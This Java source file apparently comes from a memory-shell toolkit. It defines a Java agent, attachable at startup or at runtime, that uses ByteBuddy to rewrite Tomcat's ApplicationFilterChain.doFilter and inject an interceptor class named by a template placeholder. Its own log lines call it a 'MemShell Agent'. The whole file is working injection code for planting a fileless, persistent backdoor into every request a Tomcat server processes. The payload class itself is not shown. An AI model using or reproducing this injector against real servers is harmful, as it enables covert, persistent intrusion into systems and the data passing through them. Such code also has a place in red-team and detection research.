package com.reajason.javaweb.memshell.tomcat.injector;

import net.bytebuddy.agent.builder.AgentBuilder;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.matcher.ElementMatchers;

import java.lang.instrument.Instrumentation;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/12/28
 */
public class TomcatFilterChainAgentInjector {

    public static void premain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    public static String getClassName() {
        return "{{advisorName}}";
    }

    private static void launch(Instrumentation inst) throws Exception {
        System.out.println("MemShell Agent is starting");
        Class<?> interceptorClass = Class.forName(getClassName());
        new AgentBuilder.Default()
                .ignore(ElementMatchers.none())
                .with(AgentBuilder.RedefinitionStrategy.REDEFINITION)
//                .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly())
//                .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly())
                .type(named("org.apache.catalina.core.ApplicationFilterChain"))
                .transform(
                        (builder, typeDescription, classLoader,
                         module, protectionDomain) ->
                                builder.visit(Advice.to(interceptorClass).on(named("doFilter")))
                )
                .installOn(inst);
        System.out.println("MemShell Agent is working at org.apache.catalina.core.ApplicationFilterChain.doFilter");
    }
}